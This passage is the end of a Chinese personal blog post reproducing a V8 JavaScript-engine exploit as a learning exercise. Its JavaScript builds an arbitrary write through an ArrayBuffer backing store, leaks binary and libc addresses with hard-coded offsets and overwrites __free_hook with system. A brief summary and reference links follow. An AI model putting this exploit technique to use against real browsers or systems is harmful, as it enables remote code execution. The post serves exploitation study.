<p>var data_buf = new ArrayBuffer(8);<br>var data_view = new DataView(data_buf);<br>var buf_backing_store_addr = addressOf(data_buf) + 0x20n;</p>
<p>function write64_dataview(addr, data)<br>{<br>    Write64(buf_backing_store_addr, addr);<br>    data_view.setFloat64(0, i2f(data), true);<br>    console.log(“/bin/sh &amp;&amp; exit “);<br>}</p>
<p>var float_map_addr = read64(fake_Array_addr);<br>var constructor_addr = read64(float_map_addr + 0x114fn);<br>var code_addr = read64(constructor_addr + 0x2fn);<br>var textbase_addr = read64(code_addr + 0x41n)-0xf91780n;<br>var libcbase_addr = read64(textbase_addr + 0x12737b0n) - 0x3a2e0n;<br>console.log(“[<em>] textbase_addr from: 0x” + textbase_addr.toString(16));<br>console.log(“[</em>] libcbase_addr from: 0x” + libcbase_addr.toString(16));<br>var free_hook = libcbase_addr + 0x3c67a8n;<br>var one = [0x45226n,0x4527an,0xf0364n,0xf1207n]<br>var one_gadget = libcbase_addr +0x453a0n   //  0x453a0n; system<br>console.log(“[<em>] free_hook from: 0x” + free_hook.toString(16));<br>console.log(“[</em>] one_gadget from: 0x” + one_gadget.toString(16));</p>
<p>write64_dataview(free_hook,one_gadget); </p>
<pre><code>### 总结  
首先，初学v8，很多地方都是在复现的时候自己思考的，可能与正确的解释大相径庭，希望老哥们发现错误了可以补充说明。 
然后就是自己的欠缺，由于自己js水平的拉垮程度，导致自己很多时候都知道问题所在了，但就是写不出解决的脚本，js还是需要恶补。  
最后希望和各位老哥们一起学习，快乐击剑🤺。  

### 参考链接  

https://zhuanlan.zhihu.com/p/106090872?utm_source=qzone
https://www.anquanke.com/post/id/207483#h3-5
https://www.freebuf.com/vuls/203721.html




</code></pre></div><div class="tags"><a href="/tags/Chrome/">Chrome</a></div><div class="post-nav"><a class="next" href="/2020/11/15/2020%E4%B8%8A%E6%B5%B7%E9%82%80%E8%AF%B7%E8%B5%9B%E5%88%9D%E8%B5%9BPWNWN-wp/">2020上海邀请赛初赛PWN-wp</a></div><div id="vcomment"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine@latest/dist/Valine.min.js"></script><script>var notify = 'false' ? true : false;
var verify = 'false' ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'AXNWQSAnzhoRuAsbsdqT84uQ-gzGzoHsz',
  appKey:'EcvRS3Hc6zidBU6GIBE3xBJN',
  placeholder:'Just so so',
  avatar:'mm',
  guest_info:guest_info,
  pageSize:'10'
})</script></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Writeup/" style="font-size: 15px;">Writeup</a> <a href="/tags/%E6%80%BB%E7%BB%93/" style="font-size: 15px;">总结</a> <a href="/tags/Kernel/" style="font-size: 15px;">Kernel</a> <a href="/tags/%E5%A0%86/" style="font-size: 15px;">堆</a> <a href="/tags/MSF/" style="font-size: 15px;">MSF</a> <a href="/tags/WINPWN/" style="font-size: 15px;">WINPWN</a> <a href="/tags/Chrome/" style="font-size: 15px;">Chrome</a> <a href="/tags/arm/" style="font-size: 15px;">arm</a> <a href="/tags/angr/" style="font-size: 15px;">angr</a> <a href="/tags/%E6%A0%88/" style="font-size: 15px;">栈</a> <a href="/tags/web/" style="font-size: 15px;">web</a> <a href="/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/" style="font-size: 15px;">格式化字符串</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/12/16/V8%E5%88%9D%E6%8E%A2/">V8初探</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/15/2020%E4%B8%8A%E6%B5%B7%E9%82%80%E8%AF%B7%E8%B5%9B%E5%88%9D%E8%B5%9BPWNWN-wp/">2020上海邀请赛初赛PWN-wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/11/02/2020%E6%B9%96%E6%B9%98%E6%9D%AFPWN%E9%83%A8%E5%88%86W/">2020湖湘杯PWN部分WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/14/MSF%E5%85%8D%E6%9D%80%F0%9F%90%8E%E5%88%B6%E4%BD%9C/">MSF免杀🐎</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/09/%E6%9F%90%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86pwn/">某湖论剑部分pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/09/05/WIWINPWN%E6%A0%88%E6%BA%A2%E5%87%BA/">名字叫啥</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/03/2020WMCTFTF-cfgo-CheckIn/">2020WMCTF_cfgo_CheckIn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/25/DASCTF-7%E6%9C%88pwn/">DASCTF 7月部分pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/07/01/%E6%9F%90%E5%A0%86%E5%A4%8D%E7%8E%B0-getchar%E5%BC%95%E5%8F%91malloc/">某堆复现(getchar引发malloc)</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/06/22/angr%E5%88%9D%E6%8E%A2/">angr初探</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://whali3n51.github.io/" title="whali3n51" target="_blank">whali3n51</a><ul></ul><a href="http://www.pdsdt.lovepdsdt.com/" title="Pdsdt" target="_blank">Pdsdt</a><ul></ul><a href="http://www.dongzt.cn/" title="Alkaid" target="_blank">Alkaid</a><ul></ul><a href="http://w4nder.top/" title="W4nder" target="_blank">W4nder</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">starssgo.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/search.js?v=0.0.0"></script><script>var search_path = 'search.xml';
if (search_path.length == 0) {
   search_path = 'search.xml';
}
var path = '/' + search_path;
searchFunc(path, 'local-search-input', 'local-search-result');
</script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>